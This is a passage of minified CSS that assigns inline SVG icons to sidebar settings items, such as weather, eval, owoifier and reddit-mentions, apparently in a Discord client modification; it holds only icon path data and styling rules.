5.243c-.12.244-.182.512-.182.783v6.81c0 .49.398.889.889.889h5.222c.491 0 .889-.398.889-.89V9.956a.889.889 0 00-.889-.889h-1.937a.444.444 0 01-.409-.62l2.204-5.14z' fill='%23fff'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=bot-tag-settings]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M17.251 11.693l-2.398-2.396a1.7 1.7 0 00-1.204-.497h-2.106a.85.85 0 00-.85.85v2.104c0 .452.178.882.496 1.201l2.4 2.396a.851.851 0 001.202 0l2.458-2.457a.846.846 0 00.002-1.2zm-4.856-.558a.636.636 0 01-.637-.637c0-.353.284-.638.637-.638a.638.638 0 110 1.275zM6.45 8.798a3.4 3.4 0 100-6.8 3.4 3.4 0 000 6.8zm3.395 2.954V9.81a3.574 3.574 0 00-1.015-.165h-.443a4.63 4.63 0 01-3.873 0H4.07A3.575 3.575 0 00.5 13.218v1.105c0 .704.571 1.275 1.275 1.275h9.35c.412 0 .774-.2 1.007-.502l-1.54-1.54a2.534 2.534 0 01-.747-1.804z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M14.853 9.297l2.398 2.396a.846.846 0 01-.002 1.2l-2.457 2.458a.851.851 0 01-1.204 0l-2.399-2.396a1.694 1.694 0 01-.496-1.2V9.65c0-.47.38-.85.85-.85h2.106a1.7 1.7 0 011.204.497zm-5.002-3.9a3.4 3.4 0 11-6.8.001 3.4 3.4 0 016.8 0zM9.845 9.81v1.942c0 .682.266 1.323.747 1.803l1.54 1.541a1.27 1.27 0 01-1.006.502h-9.35A1.275 1.275 0 01.5 14.323v-1.105c0-1.971 1.6-3.57 3.57-3.573h.444a4.63 4.63 0 003.873 0h.443c.354 0 .691.07 1.015.165zm1.913.688a.638.638 0 101.275 0 .638.638 0 00-1.275 0z' fill='%23fff'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=weather]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M13.6776 7.15619H13.6302C12.9998 5.90119 11.7152 5.03074 10.2167 5.03074C10.1626 5.03074 10.1105 5.03795 10.0586 5.04514C10.0243 5.04989 9.99012 5.05462 9.95548 5.05726C9.31273 3.83919 8.04994 3 6.5789 3C5.56253 3 4.58778 3.40392 3.86901 4.12294C3.15024 4.84196 2.74631 5.81719 2.74606 6.83415C2.74606 7.052 2.7754 7.26228 2.81043 7.46971C2.00247 7.81773 1.33924 8.43401 0.932676 9.21452C0.526109 9.99503 0.401099 10.892 0.578743 11.754C0.756387 12.6161 1.22581 13.3904 1.90778 13.9463C2.58976 14.5022 3.44253 14.8057 4.32217 14.8056H13.6776C14.1795 14.8056 14.6766 14.7066 15.1404 14.5144C15.6041 14.3222 16.0255 14.0405 16.3804 13.6853C16.7354 13.3302 17.0169 12.9085 17.209 12.4445C17.4011 11.9805 17.5 11.4831 17.5 10.9809C17.5 10.4786 17.4011 9.98126 17.209 9.51723C17.0169 9.0532 16.7354 8.63157 16.3804 8.27642C16.0255 7.92126 15.6041 7.63954 15.1404 7.44733C14.6766 7.25512 14.1795 7.15619 13.6776 7.15619Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M13.6776 7.15619H13.6302C12.9998 5.90119 11.7152 5.03074 10.2167 5.03074C10.1626 5.03074 10.1105 5.03795 10.0586 5.04514C10.0243 5.04989 9.99012 5.05462 9.95548 5.05726C9.31273 3.83919 8.04994 3 6.5789 3C5.56253 3 4.58778 3.40392 3.86901 4.12294C3.15024 4.84196 2.74631 5.81719 2.74606 6.83415C2.74606 7.052 2.7754 7.26228 2.81043 7.46971C2.00247 7.81773 1.33924 8.43401 0.932676 9.21452C0.526109 9.99503 0.401099 10.892 0.578743 11.754C0.756387 12.6161 1.22581 13.3904 1.90778 13.9463C2.58976 14.5022 3.44253 14.8057 4.32217 14.8056H13.6776C14.1795 14.8056 14.6766 14.7066 15.1404 14.5144C15.6041 14.3222 16.0255 14.0405 16.3804 13.6853C16.7354 13.3302 17.0169 12.9085 17.209 12.4445C17.4011 11.9805 17.5 11.4831 17.5 10.9809C17.5 10.4786 17.4011 9.98126 17.209 9.51723C17.0169 9.0532 16.7354 8.63157 16.3804 8.27642C16.0255 7.92126 15.6041 7.63954 15.1404 7.44733C14.6766 7.25512 14.1795 7.15619 13.6776 7.15619Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=grammar-nazi]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M16.7998 10L14.7998 8L9.7998 13L7.2998 10.5L5.2998 12.5L9.7998 17L16.7998 10Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M14.7998 8L16.7998 10L9.7998 17L5.2998 12.5L7.2998 10.5L9.7998 13L14.7998 8Z' fill='white'/%3E%3Cpath d='M3.89853 7.6625C3.81732 5.46875 5.52274 3.6 7.71541 3.51875C8.60872 3.51875 9.50203 3.84375 10.2329 4.49375L12.1008 2.70625C10.9638 1.56875 9.33961 1 7.79662 1C4.22337 1 1.2998 3.925 1.2998 7.5C1.2998 9.46498 2.18304 11.2336 3.57194 12.4281L5.37361 10.6264C4.50432 9.93494 3.94532 8.87963 3.89853 7.6625Z' fill='white'/%3E%3Cpath d='M7.71541 6.28125H13.8062C13.8948 6.54737 13.9351 6.78928 13.9666 7.03341L10 11L9.8749 10.8749C10.5885 10.3873 11.1142 9.63505 11.2887 8.71875H7.71541V6.28125Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M16.7998 10L14.7998 8L9.7998 13L7.2998 10.5L5.2998 12.5L9.7998 17L16.7998 10ZM7.71541 6.28125H13.8062C13.8948 6.54737 13.9351 6.78928 13.9666 7.03341L10 11L9.8749 10.8749C10.5885 10.3873 11.1142 9.63505 11.2887 8.71875H7.71541V6.28125ZM3.89853 7.6625C3.81732 5.46875 5.52274 3.6 7.71541 3.51875C8.60872 3.51875 9.50203 3.84375 10.2329 4.49375L12.1008 2.70625C10.9638 1.56875 9.33961 1 7.79662 1C4.22337 1 1.2998 3.925 1.2998 7.5C1.2998 9.46498 2.18304 11.2336 3.57194 12.4281L5.37361 10.6264C4.50432 9.93494 3.94532 8.87963 3.89853 7.6625Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=rich-quotes]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M15.969 3.30545C16.2204 2.7189 15.7901 2.06641 15.152 2.06641H13.5539C13.2148 2.06641 12.9053 2.25925 12.7559 2.56359L10.182 7.80694C10.0622 8.05076 10 8.31876 10 8.59032V15.3997C10 15.8907 10.398 16.2886 10.8889 16.2886H16.1111C16.602 16.2886 17 15.8907 17 15.3997V9.9553C17 9.46436 16.602 9.06641 16.1111 9.06641H14.174C13.8549 9.06641 13.6398 8.74019 13.7655 8.44685L15.969 3.30545Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M17 15.3997V9.9553C17 9.46436 16.602 9.06641 16.1111 9.06641H14.174C13.8549 9.06641 13.6398 8.74019 13.7655 8.44685L15.969 3.30545C16.2204 2.7189 15.7901 2.06641 15.152 2.06641H13.5539C13.2148 2.06641 12.9053 2.25925 12.7559 2.56359L10.182 7.80694C10.0622 8.05076 10 8.31876 10 8.59032V15.3997C10 15.8907 10.398 16.2886 10.8889 16.2886H16.1111C16.602 16.2886 17 15.8907 17 15.3997Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M15.969 3.30545C16.2204 2.7189 15.7901 2.06641 15.152 2.06641H13.5539C13.2148 2.06641 12.9053 2.25925 12.7559 2.56359L10.182 7.80694C10.0622 8.05076 10 8.31876 10 8.59032V15.3997C10 15.8907 10.398 16.2886 10.8889 16.2886H16.1111C16.602 16.2886 17 15.8907 17 15.3997V9.9553C17 9.46436 16.602 9.06641 16.1111 9.06641H14.174C13.8549 9.06641 13.6398 8.74019 13.7655 8.44685L15.969 3.30545Z' fill='white'/%3E%3Cpath d='M6.21931 8.38203L3.26619 7.51797C2.92439 7.41953 2.6865 7.09961 2.6865 6.74414C2.6865 6.29844 3.04744 5.9375 3.49314 5.9375H5.30603C5.63963 5.9375 5.96775 6.03867 6.24119 6.22461C6.40799 6.33672 6.6322 6.30938 6.77439 6.16992L7.72595 5.24023C7.92009 5.05156 7.89275 4.73711 7.67673 4.57031C7.00681 4.04531 6.17009 3.75273 5.3115 3.75V2.4375C5.3115 2.19687 5.11463 2 4.874 2H3.999C3.75838 2 3.5615 2.19687 3.5615 2.4375V3.75H3.49314C1.75135 3.75 0.351348 5.2457 0.512676 7.02031C0.627519 8.28086 1.59002 9.30625 2.80408 9.66172L5.60681 10.482C5.94861 10.5832 6.1865 10.9004 6.1865 11.2559C6.1865 11.7016 5.82556 12.0625 5.37986 12.0625H3.56697C3.23338 12.0625 2.90525 11.9613 2.63182 11.7754C2.46502 11.6633 2.2408 11.6906 2.09861 11.8301L1.14705 12.7598C0.95291 12.9484 0.980254 13.2629 1.19627 13.4297C1.86619 13.9547 2.70291 14.2473 3.5615 14.25V15.5625C3.5615 15.8031 3.75838 16 3.999 16H4.874C5.11463 16 5.3115 15.8031 5.3115 15.5625V14.2445C6.58572 14.2199 7.78064 13.4625 8.20174 12.2566C8.78963 10.5723 7.80252 8.84414 6.21931 8.38203Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-lmgtfy]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7.30035 2.02544C7.47768 1.98949 7.6599 1.99507 7.83828 2.0209C7.86669 2.02359 7.89511 2.02627 7.92354 2.02895C8.50037 2.08332 9.07977 2.13793 9.643 2.28131C9.82994 2.33123 10.0177 2.37944 10.2057 2.42769C11.0783 2.65172 11.9543 2.87662 12.7648 3.27758C13.1728 3.50064 13.5236 3.8047 13.8738 4.10813C14.0014 4.21876 14.129 4.3293 14.2592 4.43581C15.1469 5.31059 16.0339 6.20528 16.694 7.2717C17.0232 7.86024 17.2141 8.5193 17.294 9.18708C17.3928 9.52744 17.4341 9.87757 17.4754 10.2281C17.4835 10.2964 17.4915 10.3647 17.5 10.4329V10.5984C17.449 11.344 17.2323 12.1064 16.7313 12.6789C16.3494 13.1543 15.7763 13.4172 15.2083 13.5984C14.6376 13.7463 14.1208 14.0226 13.604 14.2989C13.3126 14.4547 13.0212 14.6105 12.7201 14.7433C11.9738 15.0959 11.1671 15.2977 10.3509 15.4027H9.18501C8.58704 15.3294 7.99257 15.2076 7.43893 14.9629C7.91856 15.0997 8.47185 14.7939 8.58739 14.3042C8.68793 13.9432 8.55179 13.5683 8.29173 13.3118C8.9923 13.3262 9.69099 13.2699 10.3896 13.2136C10.7349 13.1857 11.0802 13.1579 11.4257 13.1386C11.9019 13.1131 12.3155 12.6737 12.2827 12.1912C12.3026 11.6254 11.7273 11.1772 11.1814 11.2753C10.0794 11.3987 8.97328 11.432 7.86712 11.4654C7.17739 11.4862 6.48767 11.507 5.79897 11.5496C5.74417 10.9908 5.60628 10.4403 5.39474 9.91979C5.30084 9.68417 5.15947 9.45517 4.9378 9.32078C4.55417 9.05897 3.98343 9.16753 3.71115 9.53895C3.49647 9.81018 3.46016 10.2029 3.60503 10.5143C3.73384 10.7893 3.8609 11.0784 3.87556 11.3856C3.85235 11.513 3.78176 11.6196 3.71099 11.7264C3.66257 11.7995 3.61406 11.8727 3.5806 11.9528C3.40231 11.7307 3.2352 11.4998 3.06812 11.2688C2.79029 10.8848 2.51253 10.5009 2.18359 10.1582C1.47567 9.38012 0.729343 8.55072 0.5 7.49127V6.98022C0.533929 6.81843 0.560283 6.65471 0.586643 6.49095C0.641101 6.15263 0.695588 5.81413 0.816961 5.49211C0.868503 5.33342 0.945728 5.18639 1.02303 5.03923C1.07189 4.94619 1.12079 4.85309 1.16324 4.75696C1.38212 4.21834 1.7661 3.76419 2.18604 3.37008C2.81996 2.8154 3.55337 2.33786 4.38242 2.14378C4.53002 2.10518 4.68273 2.10606 4.83413 2.10694C4.84566 2.10701 4.85718 2.10707 4.86869 2.10712C4.62018 2.22856 4.36354 2.33133 4.10691 2.4341C3.8538 2.53545 3.60071 2.6368 3.35544 2.75606C3.0678 2.90372 2.84858 3.18472 2.80844 3.50936C2.75224 3.93593 3.0514 4.37158 3.46959 4.47421C3.73698 4.56776 4.01694 4.47316 4.26513 4.36739C4.90674 4.09895 5.55043 3.83505 6.19413 3.5715C6.58788 3.89404 6.9785 4.24347 7.23682 4.68784C7.36737 4.88507 7.58834 5.00376 7.81454 5.05542C8.35002 5.16363 8.93682 4.68505 8.87852 4.12653C8.87887 3.70554 8.60135 3.36275 8.33012 3.06953C8.17552 2.87645 7.99396 2.71017 7.81235 2.54384C7.6331 2.37968 7.4538 2.21548 7.30035 2.02544ZM5.78501 3.99842C5.36368 4.05287 5.00797 4.43162 5.00273 4.85959C4.96224 5.27778 5.2586 5.70295 5.66947 5.7986C6.20914 5.98745 6.85039 5.50259 6.81723 4.93115C6.86016 4.38973 6.31979 3.89823 5.78501 3.99842ZM12.0687 5.11965C10.995 5.32107 9.91248 5.41741 8.82651 5.50608C8.35142 5.57589 8.00094 6.06285 8.07914 6.53585C8.12347 7.06889 8.68374 7.41727 9.18955 7.34117C9.3144 7.32267 9.43955 7.31067 9.56461 7.29868C9.7392 7.28195 9.91359 7.26523 10.0867 7.23086C10.0238 7.81451 10.5754 8.37583 11.1622 8.26657C11.7109 8.18139 12.1218 7.5349 11.867 7.01688C12.0527 6.95156 12.2481 6.94048 12.4438 6.92939C12.6015 6.92045 12.7594 6.9115 12.9124 6.8741C13.3226 6.77357 13.6054 6.35887 13.5973 5.94591C13.5492 5.62965 13.3764 5.30082 13.0671 5.17341C12.766 5.03163 12.4393 5.07289 12.1222 5.11293C12.1043 5.11519 12.0865 5.11744 12.0687 5.11965ZM5.40207 7.35094C4.97166 7.42913 4.62224 7.8393 4.65226 8.28228C4.63411 8.75981 5.06277 9.16858 5.52949 9.18603C6.25023 9.36252 6.95427 9.60012 7.65814 9.83766C7.96641 9.9417 8.27465 10.0457 8.58425 10.1446C10.7545 10.9604 12.9631 11.6694 15.1804 12.3452C15.3787 12.4059 15.5937 12.4227 15.7955 12.371C16.2095 12.2436 16.5355 11.8045 16.4461 11.3636C16.3896 11.0089 16.1191 10.6996 15.7728 10.6026C15.3858 10.4798 14.9981 10.3595 14.6104 10.2392C13.6715 9.94786 12.7327 9.65652 11.8045 9.3309C11.2892 9.17093 10.783 8.98446 10.2768 8.79799C9.91916 8.66626 9.56155 8.53453 9.20072 8.41213C8.15908 8.05224 7.11255 7.70421 6.05031 7.41063C6.01783 7.40366 5.98512 7.39608 5.95222 7.38847C5.77119 7.34656 5.58463 7.30338 5.40207 7.35094Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M7.83828 2.0209C7.6599 1.99507 7.47768 1.98949 7.30035 2.02544C7.4538 2.21548 7.6331 2.37968 7.81235 2.54384C7.99396 2.71017 8.17552 2.87645 8.33012 3.06953C8.60135 3.36275 8.87887 3.70554 8.87852 4.12653C8.93682 4.68505 8.35002 5.16363 7.81454 5.05542C7.58834 5.00376 7.36737 4.88507 7.23682 4.68784C6.9785 4.24347 6.58788 3.89404 6.19413 3.5715C5.55043 3.83505 4.90674 4.09895 4.26513 4.36739C4.01694 4.47316 3.73698 4.56776 3.46959 4.47421C3.0514 4.37158 2.75224 3.93593 2.80844 3.50936C2.84858 3.18472 3.0678 2.90372 3.35544 2.75606C3.60071 2.6368 3.8538 2.53545 4.10691 2.4341C4.36354 2.33133 4.62018 2.22856 4.86869 2.10712L4.83413 2.10694C4.68273 2.10606 4.53002 2.10518 4.38242 2.14378C3.55337 2.33786 2.81996 2.8154 2.18604 3.37008C1.7661 3.76419 1.38212 4.21834 1.16324 4.75696C1.12079 4.85309 1.07189 4.94619 1.02303 5.03923C0.945728 5.18639 0.868503 5.33342 0.816961 5.49211C0.695588 5.81413 0.641101 6.15263 0.586643 6.49095C0.560283 6.65471 0.533929 6.81843 0.5 6.98022V7.49127C0.729343 8.55072 1.47567 9.38012 2.18359 10.1582C2.51253 10.5009 2.79029 10.8848 3.06812 11.2688C3.2352 11.4998 3.40231 11.7307 3.5806 11.9528C3.61406 11.8727 3.66257 11.7995 3.71099 11.7264C3.78176 11.6196 3.85235 11.513 3.87556 11.3856C3.8609 11.0784 3.73384 10.7893 3.60503 10.5143C3.46016 10.2029 3.49647 9.81018 3.71115 9.53895C3.98343 9.16753 4.55417 9.05897 4.9378 9.32078C5.15947 9.45517 5.30084 9.68417 5.39474 9.91979C5.60628 10.4403 5.74417 10.9908 5.79897 11.5496C6.48767 11.507 7.17739 11.4862 7.86712 11.4654C8.97328 11.432 10.0794 11.3987 11.1814 11.2753C11.7273 11.1772 12.3026 11.6254 12.2827 12.1912C12.3155 12.6737 11.9019 13.1131 11.4257 13.1386C11.0802 13.1579 10.7349 13.1857 10.3896 13.2136C9.69099 13.2699 8.9923 13.3262 8.29173 13.3118C8.55179 13.5683 8.68793 13.9432 8.58739 14.3042C8.47185 14.7939 7.91856 15.0997 7.43893 14.9629C7.99257 15.2076 8.58704 15.3294 9.18501 15.4027H10.3509C11.1671 15.2977 11.9738 15.0959 12.7201 14.7433C13.0212 14.6105 13.3126 14.4547 13.604 14.2989C14.1208 14.0226 14.6376 13.7463 15.2083 13.5984C15.7763 13.4172 16.3494 13.1543 16.7313 12.6789C17.2323 12.1064 17.449 11.344 17.5 10.5984V10.4329C17.4915 10.3647 17.4835 10.2964 17.4754 10.2281C17.4341 9.87757 17.3928 9.52744 17.294 9.18708C17.2141 8.5193 17.0232 7.86024 16.694 7.2717C16.0339 6.20528 15.1469 5.31059 14.2592 4.43581C14.129 4.3293 14.0014 4.21876 13.8738 4.10813C13.5236 3.8047 13.1728 3.50064 12.7648 3.27758C11.9543 2.87662 11.0783 2.65172 10.2057 2.42769C10.0177 2.37944 9.82994 2.33123 9.643 2.28131C9.07977 2.13793 8.50037 2.08332 7.92354 2.02895L7.83828 2.0209ZM8.82651 5.50608C9.91248 5.41741 10.995 5.32107 12.0687 5.11965L12.1222 5.11293C12.4393 5.07289 12.766 5.03163 13.0671 5.17341C13.3764 5.30082 13.5492 5.62965 13.5973 5.94591C13.6054 6.35887 13.3226 6.77357 12.9124 6.8741C12.7594 6.9115 12.6015 6.92045 12.4438 6.92939C12.2481 6.94048 12.0527 6.95156 11.867 7.01688C12.1218 7.5349 11.7109 8.18139 11.1622 8.26657C10.5754 8.37583 10.0238 7.81451 10.0867 7.23086C9.91359 7.26523 9.7392 7.28195 9.56461 7.29868C9.43955 7.31067 9.3144 7.32267 9.18955 7.34117C8.68374 7.41727 8.12347 7.06889 8.07914 6.53585C8.00094 6.06285 8.35142 5.57589 8.82651 5.50608ZM5.78501 3.99842C5.36368 4.05287 5.00797 4.43162 5.00273 4.85959C4.96224 5.27778 5.2586 5.70295 5.66947 5.7986C6.20914 5.98745 6.85039 5.50259 6.81723 4.93115C6.86016 4.38973 6.31979 3.89823 5.78501 3.99842ZM4.65226 8.28228C4.62224 7.8393 4.97166 7.42913 5.40207 7.35094C5.58463 7.30338 5.77119 7.34656 5.95222 7.38847C5.98512 7.39608 6.01783 7.40366 6.05031 7.41063C7.11255 7.70421 8.15908 8.05224 9.20072 8.41213C9.56155 8.53453 9.91916 8.66626 10.2768 8.79799C10.783 8.98446 11.2892 9.17093 11.8045 9.3309C12.7327 9.65652 13.6715 9.94786 14.6104 10.2392C14.9981 10.3595 15.3858 10.4798 15.7728 10.6026C16.1191 10.6996 16.3896 11.0089 16.4461 11.3636C16.5355 11.8045 16.2095 12.2436 15.7955 12.371C15.5937 12.4227 15.3787 12.4059 15.1804 12.3452C12.9631 11.6694 10.7545 10.9604 8.58425 10.1446C8.27465 10.0457 7.96641 9.9417 7.65814 9.83766C6.95427 9.60012 6.25023 9.36252 5.52949 9.18603C5.06277 9.16858 4.63411 8.75981 4.65226 8.28228Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=owoifier]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M5.94 7.68L7.47 9.72L9 7.68L10.53 9.72L12.06 7.68M4.58 8.36C4.58 9.11111 3.66666 9.72 2.54 9.72C1.41334 9.72 0.5 9.11111 0.5 8.36C0.5 7.60889 1.41334 7 2.54 7C3.66666 7 4.58 7.60889 4.58 8.36ZM17.5 8.36C17.5 9.11111 16.5867 9.72 15.46 9.72C14.3333 9.72 13.42 9.11111 13.42 8.36C13.42 7.60889 14.3333 7 15.46 7C16.5867 7 17.5 7.60889 17.5 8.36Z' stroke='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=notif-sound-changer]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M13.9744 1.32812V17.3281L9.98171 11.8549H6.9872V5.96036H9.98171L13.9744 1.32812Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M13.9744 1.32812V17.3281L9.98171 11.8549H6.9872V5.96036H9.98171L13.9744 1.32812Z' fill='white'/%3E%3Cpath d='M0.499522 9C0.499522 10.3807 1.61676 11.5 2.99495 11.5C4.37314 11.5 5.49038 10.3807 5.49038 9C5.49038 7.61929 4.37314 6.5 2.99495 6.5C1.61676 6.5 0.499522 7.61929 0.499522 9Z' fill='white'/%3E%3Cpath d='M5.49135 12.5H0.500496V17.5H5.49135V12.5Z' fill='white'/%3E%3Cpath d='M5.48994 5.5L2.99451 0.5L0.499086 5.5H5.48994Z' fill='white'/%3E%3Cpath d='M14.7398 6.2366C15.0068 5.75285 15.6144 5.5791 16.096 5.84285C17.2705 6.49035 18 7.71785 18 9.04577C18 10.3737 17.2705 11.6008 16.0965 12.2487C15.6157 12.5133 15.0076 12.3408 14.7402 11.8549C14.4745 11.3712 14.6504 10.7633 15.1332 10.4962C15.6697 10.2008 16.0033 9.64452 16.0033 9.04577C16.0033 8.44702 15.6697 7.89077 15.1328 7.59535C14.65 7.32827 14.4741 6.72035 14.7398 6.2366Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=eval]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M3 3.75L14.9996 3.75V5.25H16.4996V2.25C16.4996 1.425 15.8246 0.757502 14.9996 0.757502L3 0.75C2.175 0.75 1.5 1.425 1.5 2.25V5.25H3V3.75ZM11.5571 12.4456L14.9996 9.00313L11.5571 5.56062L10.4996 6.62562L12.8771 9.00313L10.4996 11.3806L11.5571 12.4456ZM7.4996 11.3806L5.1221 9.00313L7.4996 6.62562L6.4421 5.56062L2.9996 9.00313L6.4421 12.4456L7.4996 11.3806ZM14.9996 14.2531H3V12.7531H1.5V15.7531C1.5 16.5781 2.175 17.2531 3 17.2531H14.9996C15.8246 17.2531 16.4996 16.5781 16.4996 15.7531V12.7531H14.9996V14.2531Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M3 3.75L14.9996 3.75V5.25H16.4996V2.25C16.4996 1.425 15.8246 0.757502 14.9996 0.757502L3 0.75C2.175 0.75 1.5 1.425 1.5 2.25V5.25H3V3.75ZM11.5571 12.4456L14.9996 9.00313L11.5571 5.56062L10.4996 6.62562L12.8771 9.00313L10.4996 11.3806L11.5571 12.4456ZM7.4996 11.3806L5.1221 9.00313L7.4996 6.62562L6.4421 5.56062L2.9996 9.00313L6.4421 12.4456L7.4996 11.3806ZM14.9996 14.2531H3V12.7531H1.5V15.7531C1.5 16.5781 2.175 17.2531 3 17.2531H14.9996C15.8246 17.2531 16.4996 16.5781 16.4996 15.7531V12.7531H14.9996V14.2531Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=reddit-mentions]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M17.4997 9.17129C17.4616 8.14339 16.5987 7.34074 15.5676 7.37564C15.1108 7.3915 14.6762 7.57868 14.3462 7.89276C12.8932 6.90293 11.1864 6.36043 9.43196 6.32236L10.26 2.34083L12.9915 2.91506C13.0677 3.61619 13.6958 4.12379 14.397 4.04765C15.0981 3.97151 15.6057 3.34335 15.5296 2.64222C15.4534 1.94109 14.8253 1.43349 14.1241 1.50963C13.7212 1.55087 13.3596 1.78564 13.1597 2.13462L10.0316 1.50963C9.81901 1.46204 9.60645 1.59529 9.55886 1.81102C9.55886 1.80785 9.55886 1.81419 9.55886 1.81102L8.61662 6.23987C6.84 6.26842 5.11097 6.82044 3.63892 7.81662C2.8902 7.11232 1.71002 7.14721 1.00572 7.8991C0.301414 8.64782 0.336312 9.828 1.0882 10.5323C1.23414 10.6687 1.40228 10.7861 1.58946 10.8686C1.57677 11.0558 1.57677 11.2429 1.58946 11.4301C1.58946 14.2886 4.92062 16.614 9.02905 16.614C13.1375 16.614 16.4686 14.2917 16.4686 11.4301C16.4813 11.2429 16.4813 11.0558 16.4686 10.8686C17.1095 10.5482 17.5124 9.88828 17.4997 9.17129ZM4.73661 10.4498C4.73661 9.74551 5.31084 9.17129 6.01514 9.17129C6.71945 9.17129 7.29367 9.74551 7.29367 10.4498C7.29367 11.1541 6.71945 11.7283 6.01514 11.7283C5.30767 11.722 4.73661 11.1541 4.73661 10.4498ZM12.1508 13.9586C11.2435 14.6407 10.1331 14.9897 8.99732 14.9421C7.86156 14.9897 6.75117 14.6407 5.84383 13.9586C5.72327 13.8127 5.74548 13.5938 5.89142 13.4732C6.01832 13.3685 6.19915 13.3685 6.32922 13.4732C7.09698 14.0348 8.03287 14.3203 8.98463 14.2759C9.93639 14.3266 10.8755 14.0538 11.6527 13.4986C11.7923 13.3622 12.0207 13.3654 12.1572 13.505C12.2936 13.6446 12.2904 13.873 12.1508 14.0094V13.9586ZM11.9224 11.7728C11.2181 11.7728 10.6439 11.1985 10.6439 10.4942C10.6439 9.78993 11.2181 9.2157 11.9224 9.2157C12.6267 9.2157 13.2009 9.78993 13.2009 10.4942C13.2295 11.1985 12.6267 11.7442 11.9224 11.7728C11.9446 11.7728 11.9002 11.7728 11.9224 11.7728Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M15.5676 7.37564C16.5987 7.34074 17.4616 8.14339 17.4997 9.17129C17.5124 9.88828 17.1095 10.5482 16.4686 10.8686C16.4813 11.0558 16.4813 11.2429 16.4686 11.4301C16.4686 14.2917 13.1375 16.614 9.02905 16.614C4.92062 16.614 1.58946 14.2886 1.58946 11.4301C1.57677 11.2429 1.57677 11.0558 1.58946 10.8686C1.40228 10.7861 1.23414 10.6687 1.0882 10.5323C0.336312 9.828 0.301414 8.64782 1.00572 7.8991C1.71002 7.14721 2.8902 7.11232 3.63892 7.81662C5.11097 6.82044 6.84 6.26842 8.61662 6.23987L9.55886 1.81102C9.60645 1.59529 9.81901 1.46204 10.0316 1.50963L13.1597 2.13462C13.3596 1.78564 13.7212 1.55087 14.1241 1.50963C14.8253 1.43349 15.4534 1.94109 15.5296 2.64222C15.6057 3.34335 15.0981 3.97151 14.397 4.04765C13.6958 4.12379 13.0677 3.61619 12.9915 2.91506L10.26 2.34083L9.43196 6.32236C11.1864 6.36043 12.8932 6.90293 14.3462 7.89276C14.6762 7.57868 15.1108 7.3915 15.5676 7.37564ZM6.01514 9.17129C5.31084 9.17129 4.73661 9.74551 4.73661 10.4498C4.73661 11.1541 5.30767 11.722 6.01514 11.7283C6.71945 11.7283 7.29367 11.1541 7.29367 10.4498C7.29367 9.74551 6.71945 9.17129 6.01514 9.17129ZM11.9224 11.7728C11.2181 11.7728 10.6439 11.1985 10.6439 10.4942C10.6439 9.78993 11.2181 9.2157 11.9224 9.2157C12.6267 9.2157 13.2009 9.78993 13.2009 10.4942C13.2295 11.1985 12.6267 11.7442 11.9224 11.7728ZM8.99732 14.9421C10.1331 14.9897 11.2435 14.6407 12.1508 13.9586V14.0094C12.2904 13.873 12.2936 13.6446 12.1572 13.505C12.0207 13.3654 11.7923 13.3622 11.6527 13.4986C10.8755 14.0538 9.93639 14.3266 8.98463 14.2759C8.03287 14.3203 7.09698 14.0348 6.32922 13.4732C6.19915 13.3685 6.01832 13.3685 5.89142 13.4732C5.74548 13.5938 5.72327 13.8127 5.84383 13.9586C6.75117 14.6407 7.86156 14.9897 8.99732 14.9421Z' 